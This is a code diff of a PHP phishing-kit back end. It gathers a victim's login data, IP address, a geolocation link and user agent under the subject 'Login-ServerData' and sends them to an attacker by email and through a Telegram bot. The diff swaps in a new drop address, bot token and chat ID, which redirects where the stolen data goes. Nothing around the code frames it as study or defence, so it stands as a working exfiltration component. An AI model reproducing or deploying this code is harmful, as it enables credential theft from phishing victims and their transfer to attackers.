@@ -12,7 +12,7 @@ $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "User Agent: $useragent\n";
 $message .= "-----------+ Powered By at Abilitytiger +-----------\n";
 
-$send = "norereply@yandex.com";
+$send = "norereply@noway.com";
 
 $subject = "Login-ServerData";
 $headers .= "MIME-Version: 1.0\n";
@@ -40,8 +40,8 @@ function sendMessage($chatID, $messaggio, $token) {
     curl_close($ch);
     return $result;
 }
-$token = "6826179991:AAE5NHOgpOyBiRzjZSU1hoZAl1P_BJGJMWk";
-$chatid = "803547119";
+$token = "7192456887:AAE2KKAAUEGnXIZG39YkRnXJPRrcOeSssY4";
+$chatid = "1713866119";
 sendMessage($chatid, $message, $token);
 
 ?>
